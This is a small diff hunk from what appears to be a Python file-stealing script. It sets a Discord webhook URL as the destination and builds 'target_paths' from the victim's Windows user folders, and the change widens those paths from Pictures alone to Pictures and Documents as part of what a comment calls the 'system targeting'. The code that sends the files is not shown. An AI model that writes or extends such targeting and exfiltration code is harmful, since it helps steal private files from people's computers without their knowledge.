@@ -28,7 +28,7 @@ time.sleep(5)
 
 webhook_url = "https://discord.com/api/webhooks/url-hook-url"
 user = getpass.getuser()
-target_paths = [f"C:\\Users\\{user}\\Pictures"]
+target_paths = [f"C:\\Users\\{user}\\Pictures", f"C:\\Users\\{user}\\Documents"]
 ID_range = 1000000
 # defines variables that effect the system targeting
 
